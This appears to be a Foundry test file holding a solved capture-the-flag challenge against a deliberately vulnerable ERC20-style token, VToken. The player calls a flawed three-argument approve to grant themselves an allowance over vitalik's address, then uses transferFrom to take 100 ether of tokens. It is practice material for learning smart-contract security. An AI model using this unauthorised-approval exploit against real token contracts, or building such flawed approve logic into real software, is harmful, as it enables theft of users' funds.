// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";


import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {VToken} from "../src/Challenge0.VToken.sol";

contract Challenge0Test is StdCheats, Test {
    address token;

    address player = makeAddr("player");
    address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

    function setUp() public {
        
        token = address(new VToken());
        
        vm.label(token, "VToken");
        vm.label(vitalik, "vitalik.eth");
        vm.label(player, "Player");
    }

    function testChallenge() public {        
        vm.startPrank(player);
        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//

        bool isApproved = VToken(token).approve(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045, player, 101 ether);
        console.log("isApproved :", isApproved);
        if(isApproved) {        
        VToken(token).transferFrom(vitalik, player, 100 ether);                
        }
        uint256 playerBalanceAfterAttack = VToken(token).balanceOf(player);
        vm.stopPrank();


        console.log("Is it 100 ether yet ? :", playerBalanceAfterAttack);
        assertEq(
            IERC20(token).balanceOf(player),
            IERC20(token).totalSupply(),
            "you must get all the tokens"
        );
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/
